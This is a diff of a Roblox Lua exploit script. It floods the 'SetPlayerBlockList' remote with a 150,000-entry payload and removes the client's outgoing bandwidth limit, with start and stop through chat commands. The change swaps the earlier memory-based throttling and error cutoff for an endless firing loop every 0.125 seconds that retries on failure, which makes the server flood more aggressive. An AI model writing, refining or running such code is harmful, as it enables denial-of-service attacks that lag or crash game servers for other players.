@@ -1,57 +1,31 @@
 --!nonstrict
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
-local Stats = game:GetService("Stats")
 
 local player = Players.LocalPlayer
 
--- ═══════════ CORE ═══════════
+-- ═══════════ CONFIG ═══════════
 local Children       = 150000
 local NestedPerChild = 0
 local FieldsPerChild = 0
 local FireBurst      = 1.5
+local FrameDelay     = 0.125
 local FieldSize      = 0
 local RebuildEach    = false
-local Format         = "pair"
+local Format         = "pair"   -- pair | compact | flat
+-- ══════════════════════════════
 
-local StartInterval  = 2.5
-local MinInterval    = 0.30
-local MaxInterval    = 15.0
-local BackoffFactor  = 1.45
-local SpeedupFactor  = 0.88
-local SpeedupAfter   = 4
-local PanicMB        = 250
-local StartDelay     = 0.10
-local BuildYieldEvery = 100000
-
-local BYTES_PER_ENTRY = { pair = 15, compact = 13, flat = 9 }
 local RemoteCandidates = {
     { "RobloxReplicatedStorage", "SetPlayerBlockList" },
     { "ReplicatedStorage",       "SetPlayerBlockList" },
 }
 
 local state = {
-    running = false, thread = nil, remote = nil, cache = nil,
-    errors = 0, base = nil, queued = 0,
-    payloadMb = 1, interval = StartInterval, samples = {},
+    running = false,
+    cache = nil,
+    remote = nil,
+    errors = 0,
 }
-
-local function getMem()
-    local ok, mb = pcall(function() return Stats:GetTotalMemoryUsageMb() end)
-    if ok and type(mb) == "number" then return mb end
-    local ok2, mb2 = pcall(function() return Stats:GetMemoryUsageMb() end)
-    if ok2 and type(mb2) == "number" then return mb2 end
-    return nil
-end
-
-local function pushSample(m)
-    local s = state.samples
-    s[#s + 1] = m
-    while #s > 10 do table.remove(s, 1) end
-    local lo = math.huge
-    for _, v in ipairs(s) do if v < lo then lo = v end end
-    if lo < math.huge then state.base = lo end
-end
 
 local function resolve()
     for _, path in ipairs(RemoteCandidates) do
@@ -68,31 +42,21 @@ local function resolve()
     return nil
 end
 
-local function estimatePayloadMb()
-    return math.max(Children * (BYTES_PER_ENTRY[Format] or 15) / 1000000, 0.05)
-end
-
 pcall(function()
     game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
 end)
 
-local function build(yieldAllowed)
+local function build()
     local n = Children
     local root = table.create(n)
 
     if Format == "flat" then
-        for i = 1, n do
-            root[i] = i
-            if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
-        end
+        for i = 1, n do root[i] = i end
         return root
     end
 
     if Format == "compact" then
-        for i = 1, n do
-            root[i] = { i, i * 2 }
-            if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
-        end
+        for i = 1, n do root[i] = { i, i * 2 } end
         return root
     end
 
@@ -106,23 +70,42 @@ local function build(yieldAllowed)
             entry["n" .. j] = { a = i, b = j }
         end
         root[i] = entry
-        if yieldAllowed and (i % BuildYieldEvery == 0) then task.wait() end
     end
     return root
 end
 
-local function fire()
-    if not state.remote then
-        state.remote = resolve()
-        if not state.remote then return end
+-- ═══════════ INFINITE LOOP ═══════════
+local function runLoop()
+    -- build payload once (or every pass if RebuildEach)
+    if RebuildEach or not state.cache then
+        state.cache = build()
     end
-    local payload = state.cache
-    if RebuildEach or not payload then
-        payload = build(false)
-        if not RebuildEach then state.cache = payload end
-    end
-    for _ = 1, FireBurst do
-        state.remote:FireServer(payload)
+
+    while state.running do
+        if not state.remote then
+            state.remote = resolve()
+        end
+
+        if state.remote then
+            local ok = pcall(function()
+                for _ = 1, FireBurst do
+                    state.remote:FireServer(state.cache)
+                end
+            end)
+
+            if ok then
+                state.errors = 0
+                task.wait(FrameDelay)
+            else
+                -- remote errored (rate limit, disconnect, etc.) — reset and retry
+                state.errors += 1
+                state.remote = nil
+                task.wait(0.5)
+            end
+        else
+            -- remote not found yet — keep trying
+            task.wait(0.25)
+        end
     end
 end
 
@@ -130,99 +113,17 @@ local function start()
     if state.running then return end
     state.running = true
     state.errors = 0
-
-    state.thread = task.spawn(function()
-        if StartDelay > 0 then task.wait(StartDelay) end
-
-        state.cache = build(true)
-        state.payloadMb = estimatePayloadMb()
-        state.samples = {}
-        state.interval = StartInterval
-
-        task.wait(0.4)
-
-        local m0 = getMem()
-        if m0 then pushSample(m0) end
-
-        if not state.remote then state.remote = resolve() end
-        if state.remote and m0 then
-            local c0 = os.clock()
-            pcall(fire)
-            task.wait(0.3)
-            local peak = getMem()
-            if peak and peak > m0 then
-                state.payloadMb = math.max(peak - m0, estimatePayloadMb())
-            end
-            task.wait(math.max(0, StartInterval - (os.clock() - c0)))
-            local f = getMem()
-            if f then pushSample(f) end
-        end
-
-        local interval = StartInterval
-        local good = 0
-
-        while state.running do
-            if not state.remote then
-                state.remote = resolve()
-                if not state.remote then task.wait(0.25); continue end
-            end
-
-            local m = getMem()
-            local queued = 0
-            if m and state.base then
-                queued = math.max(m - state.base, 0)
-                state.queued = queued
-            end
-
-            local hi = state.payloadMb * 2.5
-            local lo = state.payloadMb * 1.2
-
-            if queued > PanicMB then
-                interval = MaxInterval
-                good = 0
-            elseif queued > hi then
-                interval = math.min(interval * BackoffFactor, MaxInterval)
-                good = 0
-            elseif queued < lo then
-                good += 1
-                if good >= SpeedupAfter then
-                    good = 0
-                    interval = math.max(interval * SpeedupFactor, MinInterval)
-                end
-            end
-
-            local f0 = os.clock()
-            local ok = pcall(fire)
-            local cost = os.clock() - f0
-            state.interval = interval
-
-            if ok then
-                state.errors = 0
-            else
-                state.errors += 1
-            end
-
-            if state.errors > 30 then
-                state.running = false
-                break
-            end
-
-            task.wait(math.max(0.05, interval - cost))
-
-            local m2 = getMem()
-            if m2 then pushSample(m2) end
-        end
-    end)
+    task.spawn(runLoop)
 end
 
 local function stop()
     state.running = false
-    if state.thread then pcall(task.cancel, state.thread) end
-    state.thread, state.cache = nil, nil
-    state.queued = 0
+    state.cache = nil
+    state.remote = nil
+    state.errors = 0
 end
 
--- ═══════════ CHAT COMMAND ═══════════
+-- ═══════════ CHAT COMMANDS ═══════════
 local started = false
 
 local function onMessage(msg)
@@ -240,12 +141,12 @@ local function onMessage(msg)
     end
 end
 
--- Path 1: Player.Chatted
+-- Path 1: legacy / normal chat
 pcall(function()
     player.Chatted:Connect(onMessage)
 end)
 
--- Path 2: TextChatService.MessageReceived
+-- Path 2: modern TextChatService
 pcall(function()
     TextChatService.MessageReceived:Connect(function(message)
         if not message.TextSource then return end
